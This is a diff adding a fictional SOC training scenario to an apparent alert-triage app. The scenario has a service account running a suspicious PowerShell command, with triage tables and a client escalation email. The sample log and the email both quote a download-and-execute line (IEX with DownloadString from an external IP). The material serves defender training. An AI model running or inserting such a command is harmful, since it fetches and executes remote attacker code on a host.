@@ -610,8 +610,154 @@ Escalation Ref: ALTURA-INSDR-0622-004`,
       "Final Recommendation": "User access revocation + data restoration + review",
     }
   },
+  {
+    id: 'service-account-powershell',
+    title: 'Suspicious PowerShell Execution from Backup Service Account',
+    icon: Code,
+    color: 'text-green-500',
+    alert: {
+      name: 'Unusual PowerShell Execution – Service Account Activity',
+      severity: 'High',
+      client: 'Medivault Tech Sdn Bhd',
+      source: 'EDR (XDR Agent) + Sysmon + UEBA',
+      endpoint: 'SRV-AD-03',
+      user: 'svc_backup@medivault.local',
+      triggerTime: '2025-06-22 03:19 GMT+8',
+    },
+    background: 'Service accounts are monitored for abnormal interactive activity. This account svc_backup@medivault.local is used for backup automation and is not expected to initiate remote scripts or perform PowerShell commands outside backup hours (2:00 AM–2:30 AM GMT+8). Alert fired due to execution of suspicious PowerShell command outside that window.',
+    correlatedLogs: [
+      {
+        title: 'Log 1: Sysmon Event – PowerShell Execution',
+        content: {
+          "event_id": 4104,
+          "timestamp": "2025-06-22T19:19:47Z",
+          "host": "SRV-AD-03",
+          "user": "svc_backup@medivault.local",
+          "scriptBlockText": "IEX(New-Object Net.WebClient).DownloadString('http://185.101.94.13/recon.ps1')",
+          "processName": "powershell.exe",
+          "parentProcess": "svchost.exe",
+          "hash": "ac8e3c91bdf249ed62a0eae8a7a109b9"
+        }
+      },
+      {
+        title: 'Log 2: EDR Alert – Malicious PowerShell Pattern',
+        content: {
+          "timestamp": "2025-06-22T19:20:03Z",
+          "eventType": "SuspiciousCommand",
+          "user": "svc_backup@medivault.local",
+          "device": "SRV-AD-03",
+          "command": "DownloadString from external IP",
+          "commandHash": "ac8e3c91bdf249ed62a0eae8a7a109b9",
+          "severity": "High",
+          "IOCMatched": "Remote Payload Download"
+        }
+      },
+      {
+        title: 'Log 3: UEBA Event – Service Account Behavioural Deviation',
+        content: {
+          "user": "svc_backup@medivault.local",
+          "timestamp": "2025-06-22T19:21:00Z",
+          "behaviour": "Unusual PowerShell Usage",
+          "riskScore": 92,
+          "description": "Service account executed PowerShell with external reach-out – pattern not seen in 90-day baseline."
+        }
+      }
+    ],
+    workflow: [
+      {
+        title: 'Step 1: L1 Validation',
+        content: 'The L1 analyst reviews the initial alert and correlated logs to determine the immediate threat level and required escalation path.',
+        table: {
+          headers: ['Question', 'Answer', 'Notes'],
+          rows: [
+            ['Is this a legitimate service account action?', 'No', 'Not within backup automation time window'],
+            ['Is the PowerShell command expected or whitelisted?', 'No', 'IEX (Invoke-Expression) and external download are not approved'],
+            ['Was it run interactively or via system process?', 'Looks initiated under svchost.exe', 'Stealth technique'],
+            ['Escalation Decision', 'Escalate to L2', 'Escalate to L2 for context review and possible containment'],
+          ]
+        }
+      },
+      {
+        title: 'Step 2: L2 Deep Analysis',
+        content: 'The L2 analyst performs deeper investigation using threat intelligence and forensic data to confirm the attack vector and scope.',
+        table: {
+          headers: ['Question', 'Answer', 'Notes'],
+          rows: [
+            ['Does the scriptBlockText indicate malicious intent?', 'Yes', 'IEX + remote payload fetch from external IP'],
+            ['Is the source IP (185.101.94.13) known in threat intel feeds?', 'Yes', 'Listed under C2 infrastructure watchlist'],
+            ['Is the service account domain privileged?', 'Yes', 'Can access backup shares and remote folders'],
+            ['Any recent changes to the service account (password, permissions)?', 'Unknown', 'Requires domain audit from client'],
+            ['Was any file written or dropped on the endpoint after script ran?', 'Not detected yet', 'Needs deeper forensic pull if approved'],
+            ['Has the same command been executed from other endpoints?', 'No', 'Isolated to SRV-AD-03 as of now'],
+          ]
+        }
+      },
+      {
+        title: 'Step 3: Decision – Escalate to Client?',
+        content: 'The L2 analyst determines that the incident warrants immediate client notification due to the sophistication and target.',
+        table: {
+          headers: ['Reason', 'Status'],
+          rows: [
+            ['Malicious PowerShell execution from privileged account', 'High Risk'],
+            ['Tactic matches common C2 beaconing (via DownloadString)', 'High Risk'],
+            ['Triggered across Sysmon, EDR and UEBA', 'High Risk'],
+            ['Service account likely compromised or misused', 'High Risk'],
+          ]
+        }
+      },
+    ],
+    escalationSubject: '[HIGH] Suspicious PowerShell Execution from Backup Service Account – Potential Compromise (svc_backup@medivault.local)',
+    escalationBody: `Dear Medivault IR Team,
+Our monitoring tools have detected suspicious PowerShell activity originating from a critical service account used for automated backup operations. This activity may indicate compromise or unauthorised script injection. Details as follows:
+
+**Incident Summary**
+• User: svc_backup@medivault.local
+• Device: SRV-AD-03
+• Time: 2025-06-22 03:19 GMT+8
+• Activity: PowerShell script execution
+• Command: IEX(New-Object Net.WebClient).DownloadString('http://185.101.94.13/recon.ps1')
+• Tool Detection: Sysmon + EDR + UEBA
+• Deviated From Baseline: Yes (not observed in past 90 days)
+
+**Risk Assessment**
+• The script is attempting to download a PowerShell payload from an IP known to host C2 infrastructure.
+• The account involved has high privileges in the backup environment.
+• Behaviour significantly deviates from the account’s expected usage and normal hours of operation.
+• There is no legitimate justification found in policy or automation logs.
+
+**Recommendations**
+1. Immediately disable the service account or rotate credentials.
+2. Isolate the affected host (SRV-AD-03) for forensic review.
+3. Hunt for related activity across other critical infrastructure (PowerShell logs, lateral movement).
+4. Review Group Policy and backup automation to prevent service disruption after account disablement.
+5. Scan endpoint and memory for dropped payloads.
+
+**Supporting Data**
+• Sysmon Event ID 4104 log entry (script block execution)
+• EDR alert metadata (command hash, detection pattern)
+• UEBA behavioural deviation report
+• Threat Intel match for external IP: 185.101.94.13
+
+Please confirm if you would like MSSP team to:
+• Execute SOAR playbook to disable account
+• Perform forensic triage and malware memory dump
+• Apply temporary outbound PowerShell restriction via GPO
+
+Best regards,
+CYSEC MSSP SOC Team
+Escalation Ref: MEDIVAULT-POWERSHELL-0622-005`,
+    finalDocumentation: {
+      "Alert ID": "SIEM-CL-MEDI-202506220319",
+      "Escalation ID": "MEDIVAULT-POWERSHELL-0622-005",
+      "Alert Category": "Suspicious Script Execution – Service Account",
+      "Escalated To": "Medivault IR + Domain Admins",
+      "Severity": "High",
+      "Status": "Escalated – Pending Response",
+      "Follow-Up Time": "1 hour (due to potential privilege abuse)",
+      "Final Recommendation": "Disable account + Host isolation + Forensic review",
+    }
+  },
   // Placeholder scenarios
-  { id: 'service-account-powershell', title: 'Service Account PowerShell Execution', icon: Code, color: 'text-green-500', alert: { name: 'Service Account Anomaly', severity: 'High', client: 'N/A', source: 'N/A', endpoint: 'N/A', user: 'N/A', triggerTime: 'N/A' }, background: 'Placeholder', correlatedLogs: [], workflow: [], escalationSubject: 'Placeholder', escalationBody: 'Placeholder', finalDocumentation: {} },
   { id: 'cloud-misconfig-s3', title: 'Cloud Misconfiguration (S3 Exposure)', icon: Cloud, color: 'text-blue-500', alert: { name: 'Public Bucket Detected', severity: 'High', client: 'N/A', source: 'N/A', endpoint: 'N/A', user: 'N/A', triggerTime: 'N/A' }, background: 'Placeholder', correlatedLogs: [], workflow: [], escalationSubject: 'Placeholder', escalationBody: 'Placeholder', finalDocumentation: {} },
   { id: 'lateral-movement-psexec', title: 'Lateral Movement via PsExec', icon: Zap, color: 'text-red-500', alert: { name: 'PsExec Usage', severity: 'High', client: 'N/A', source: 'N/A', endpoint: 'N/A', user: 'N/A', triggerTime: 'N/A' }, background: 'Placeholder', correlatedLogs: [], workflow: [], escalationSubject: 'Placeholder', escalationBody: 'Placeholder', finalDocumentation: {} },
   { id: 'mfa-push-fatigue', title: 'MFA Push Fatigue Attack', icon: User, color: 'text-orange-500', alert: { name: 'MFA Failure Spike', severity: 'Medium', client: 'N/A', source: 'N/A', endpoint: 'N/A', user: 'N/A', triggerTime: 'N/A' }, background: 'Placeholder', correlatedLogs: [], workflow: [], escalationSubject: 'Placeholder', escalationBody: 'Placeholder', finalDocumentation: {} },
